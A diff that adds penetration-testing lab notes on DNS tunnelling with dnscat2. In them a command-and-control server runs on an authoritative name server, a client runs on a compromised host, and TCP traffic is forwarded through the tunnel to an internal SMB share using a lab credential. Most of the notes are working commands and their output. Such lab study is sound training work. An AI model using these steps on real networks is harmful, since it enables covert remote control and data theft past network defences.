@@ -432,3 +432,137 @@ nslookup -type=txt www.feline.corp
 
 
 > If we wanted to infiltrate binary data, we could serve it as a series of Base64 or ASCII hex encoded TXT records and convert them back into binary on the internal server
+
+
+## dnscat
+
+Server runs on Authoritative Name Server for a particular domain
+Clients (configured to make queries to the domain) run to on compromised endpoints
+
+>While the endpoints already have **dnscat**, we'll most likely need to transfer the binary to the devices ourselves.
+
+
+Start the **dnscat** server on the authoritative name server FELINEAUTHORITY
+```bash
+dnscat2-server feline.corp
+	[sudo] password for kali: 
+	
+	New window created: 0
+	dnscat2> New window created: crypto-debug
+	Welcome to dnscat2! Some documentation may be out of date.
+	
+	auto_attach => false
+	history_size (for new windows) => 1000
+	Security policy changed: All connections must be encrypted
+	New window created: dns1
+	Starting Dnscat2 DNS server on 0.0.0.0:53
+	[domains = feline.corp]...
+	
+	Assuming you have an authoritative DNS server, you can run
+	the client anywhere with the following (--secret is optional):
+	
+	  ./dnscat --secret=bfa3bcd7ea551a8277c4a7e83bff0cc5 feline.corp
+	
+	To talk directly to the server without a domain name, run:
+	
+	  ./dnscat --dns server=x.x.x.x,port=53 --secret=bfa3bcd7ea551a8277c4a7e83bff0cc5
+	
+	Of course, you have to figure out <server> yourself! Clients
+	will connect directly on UDP port 53.
+```
+
+- Run client binary on PGDATABASE01
+```bash
+./dnscat feline.corp
+Creating DNS driver:
+ domain = feline.corp
+ host   = 0.0.0.0
+ port   = 53
+ type   = TXT,CNAME,MX
+ server = 127.0.0.53
+
+Encrypted session established! For added security, please verify the server also displays this string:
+
+Bulby Ennui Ardent Gouge Redear Cleft 
+
+Session established!
+```
+
+- Can verify connection back in FELINEAUTHORITY
+```bash
+	New window created: 1
+	Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
+	For added security, please ensure the client displays the same string:
+	
+>> 	Bulby Ennui Ardent Gouge Redear Cleft
+```
+
+> Notice in **tcpdump**'s output there is a lot of noise, esp regarding .TXT, .MX, and .CNAME record queries and responses.
+
+- Interact with the session via the server
+```bash
+# View available windows [ dnscat2> ]
+windows
+	0 :: main [active]
+	  crypto-debug :: Debug window for crypto stuff [*]
+	  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
+	  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
+
+# Select command window [ dnscat2> ]
+window -i 1
+	New window created: 1
+	history_size (session) => 1000
+	Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
+	For added security, please ensure the client displays the same string:
+	
+>> 	Bulby Ennui Ardent Gouge Redear Cleft
+	This is a command session!
+	
+	That means you can enter a dnscat2 command such as
+	'ping'! For a full list of clients, try 'help'.
+	
+	1 :: command (pgdatabase01) [encrypted, NOT verified] [active]
+
+# View list of available commands  [ command (pgdatabase01) 1> ]
+?
+
+	Here is a list of commands (use -h on any of them for additional help):
+	* clear
+	* delay
+	* download
+	* echo
+	* exec
+	* help
+	* listen
+	* ping
+	* quit
+	* set
+	* shell
+	* shutdown
+	* suspend
+	* tunnels
+	* unset
+	* upload
+	* window
+	* windows
+```
+
+- Set up a listening port on our dnscat2 server, and push TCP traffic through our DNS tunnel to HRSHARES SMB shares at 445
+```bash
+# command (pgdatabase01) 1>
+listen 127.0.0.1:4455 172.16.227.217:445
+	Listening on 127.0.0.1:4455, sending connections to 172.16.227.217:445
+```
+
+- From another shell on FELINEAUTHORITY, list HRSHARES' SMB shares
+```bash
+smbclient -L //127.0.0.1 -p 4455 -U hr_admin --password=Welcome1234
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Scripts         Disk      
+        Users           Disk      
+	SMB1 disabled -- no workgroup available
+```
